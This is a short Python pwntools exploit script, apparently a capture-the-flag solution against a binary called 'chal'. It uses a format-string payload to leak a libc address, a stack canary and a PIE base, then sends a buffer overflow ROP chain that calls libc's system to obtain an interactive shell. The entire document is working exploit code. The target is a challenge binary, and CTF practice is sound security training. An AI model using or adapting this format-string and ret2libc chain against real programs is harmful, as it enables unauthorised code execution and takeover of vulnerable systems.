from pwn import *

elf = ELF('./chal')
libc_bin = ELF('./libc.so.6')
p = elf.process()
gdb.attach(p, '''c''')


p.recvuntil(b'tat!\n')
p.sendline(b'%p.%15$p.%17$p')
data = p.recv().split(b'\n')[0]
print(data)
canary = data.split(b'.')[1]
canary = str(canary)[2:-1]
canary = int(canary, 16)


libc = data.split(b'.')[0]
libc = str(libc)[2:-1]
libc = int(libc, 16) - 0x1d6963

libc_bin.address = libc

print(hex(libc), 'LIBC')

pie = data.split(b'.')[-1]
pie = str(pie)[2:-1]
pie = int(pie, 16) - 0x1432

print(hex(pie), 'PIE')

print(hex(canary))
# print(data)

payload = b'A'*72 + p64(canary) + b'B'*8 + b'CCCCDDDD'

payload = flat(
    b'A'*72,
    p64(canary),
    b'B'*8,
    p64(0x0000000000001376 + pie),
    p64(libc + 0x197e34),
    p64(0x0000000000001016 + pie),
    p64(libc_bin.sym.system)
)

p.sendline(payload)


p.interactive()